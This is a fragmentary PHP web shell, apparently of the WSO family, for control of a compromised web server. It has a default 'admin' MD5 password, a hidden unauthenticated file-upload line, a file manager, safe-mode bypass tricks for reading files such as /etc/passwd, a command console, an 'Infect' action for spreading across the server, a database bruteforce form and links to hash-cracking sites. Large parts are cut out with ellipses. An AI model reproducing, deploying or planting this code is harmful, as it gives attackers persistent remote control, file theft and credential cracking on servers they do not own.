<?php 
$auth_pass = "21232f297a57a5a743894a0e4a801fc3"; //admin (md5)
 $color = "#fff";
...
">
	Password: <input type=password name=pass style="background-color:whitesmoke;
...
isset($_FILES['a'])?copy($_FILES['a']['tmp_name'],$_FILES['a']['name']):0; if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) if( empty( $auth_pass ) || ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) ) $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
 else printLogin();
...
<?php echo isset($_POST['p1'])?htmlspecialchars($_POST['p1']):''
?>'>
<input type=hidden name=p2 value='
<?php echo isset($_POST['p2'])?htmlspecialchars($_POST['p2']):''
?>'>
<input type=hidden name=p3 value='
<?php echo isset($_POST['p3'])?htmlspecialchars($_POST['p3']):''
?>'>
...
$freeSpace = @diskfreespace($GLOBALS['cwd']);
 ...
 if( strpos('Linux', $kernel) !== false ) $millink .= urlencode( 'Linux Kernel ' . substr($release,0,6) );
...
"><tr>'.$menu.'</tr></table><div>';
 } function printFooter() { $is_writable = is_writable($GLOBALS['cwd'])?"<font color=teal>[ Writeable ]</font>":"<font color=red>[ Not writable ]</font>";
...
return false;
"><span>Change dir:</span><br><input class="toolsInp" type=text name=c value="
<?php echo htmlspecialchars($GLOBALS['cwd']);
...
return false;
"><span>Make dir:</span><br><input class="toolsInp" type=text name=d><input type=submit value=">>"></form>
<?php echo $is_writable
?></td>
		<td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');
return false;
"><span>Make file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form>
<?php echo $is_writable
?></td>
	</tr>
	<tr>
...
<?php echo isset($_POST['charset'])?$_POST['charset']:''
?>'>
		<span>Upload file:</span><br><input class="toolsInp" type=file name=f><input type=submit value=">>"></form>
<?php echo $is_writable
?></td>
	</tr>
</table>
...
<?php } if ( !function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false) ) { function posix_getpwuid($p) { return false;
 ...
 else return '<font color=#00A8A8><b>'.perms(@fileperms($f)).'</b></font>';
...
<?php if(!empty($_SESSION['act'])&&@count($_SESSION['f'])){
...
"><br>
			<input type="button" value="hashcrack.com" onclick="document.hf.action='http://www.hashcrack.com/index.php';
document.hf.submit()"><br>
			<input type="button" value="fakenamegenerator.com" onclick="document.hf.action='http://www.fakenamegenerator.com/';
document.hf.submit()"><br>
			<input type="button" value="tools4noobs.com" onclick="document.hf.action='http://www.tools4noobs.com/online_php_functions/';
document.hf.submit()"><br>
			<input type="button" value="md5.rednoize.com" onclick="document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';
document.hf.submit()"><br>
			<input type="button" value="md5decrypter.com" onclick="document.hf.action='http://www.md5decrypter.com/';
document.hf.submit()"><br>
		</form>
	</div>
...
"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value=">>"></form>';
 ...
 ob_start();
 switch($_POST['p1']) { case 1: $temp=@tempnam($test, 'cx');
...
return false;
\'><input type=text name=param><input type=submit value=">>"></form><br><span>Glob (list dir)</span><form onsubmit=\'g(null,null,"2",this.param.value);
return false;
\'><input type=text name=param><input type=submit value=">>"></form><br><span>Curl (read file)</span><form onsubmit=\'g(null,null,"3",this.param.value);
return false;
\'><input type=text name=param><input type=submit value=">>"></form><br><span>Ini_restore (read file)</span><form onsubmit=\'g(null,null,"4",this.param.value);
return false;
\'><input type=text name=param><input type=submit value=">>"></form><br><span>Posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);
return false;
\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form><br><br><span>Imap_open (read file)</span><form onsubmit=\'g(null,null,"6",this.param.value);
return false;
...
<?php echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(document.cf.cmd.value==\'clear\'){document.cf.output.value=\'\';
...
">';
 ...
 printFooter();
 } function actionTools() { printHeader();
 printFooter();
 } function actionDomains() { printHeader();
 error_reporting(0);
...
";
 printFooter();
 } function actionInfect() { printHeader();
 ...
 }else{ echo "<form method=post><input type=submit value=Infect name=infet></form>";
 echo 'Really want to infect the server?&nbsp;
<a href=# onclick="g(null,null,\'infect\')">Yes</a></div>';
 } printFooter();
 } function actionBruteforce() { printHeader();
...
?>'>
				<td>
					<select name='type'>
						<option value="mysql" 
<?php if(@$_POST['type']=='mysql')echo 'selected';

?>>MySql</option>
						<option value="pgsql" 
<?php if(@$_POST['type']=='pgsql')echo 'selected';

?>>PostgreSql</option>
					</select></td>
				<td><input type=text name=sql_host value='
<?php echo (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host']));

?>'></td>
				<td><input type=text name=sql_login value='
<?php echo (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login']));

?>'></td>
				<td><input type=text name=sql_pass value='
<?php echo (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass']));

?>'></td>
				<td>
	
<?php $tmp = "<input type=text name=sql_base value=''>";
...
<?php if(isset($db) && $db->link){ echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
